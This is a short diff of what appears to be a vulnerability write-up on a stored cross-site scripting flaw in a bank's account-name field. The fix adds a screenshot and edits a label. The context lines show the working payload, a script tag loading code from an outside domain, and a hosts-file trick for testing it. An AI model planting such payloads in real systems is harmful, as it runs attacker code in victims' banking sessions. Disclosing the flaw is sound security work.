@@ -20,6 +20,8 @@ Include following javascript code within your bank account name and save changes
 ```
 A<script src=“//p0wn.eu”></script>
 ```
+![Setting XSS payload](https://i.imgur.com/ITOX13M.png)
+
 
 *Note* To make an isolated check from external network a simple trick can be used:
 Point domain used within payload to the IP address you control and save the entry within system’s `hosts` file. Then host any JS payload on the HTTPS web server.
@@ -55,7 +57,7 @@ Or in mobile application goto
 ```
 
 Then the payload is executed (pictures included).
-Desktop (browser):
+Desktop:
 ![Stored XSS attack](https://i.imgur.com/QRLirjN.png)
 
 Mobile:
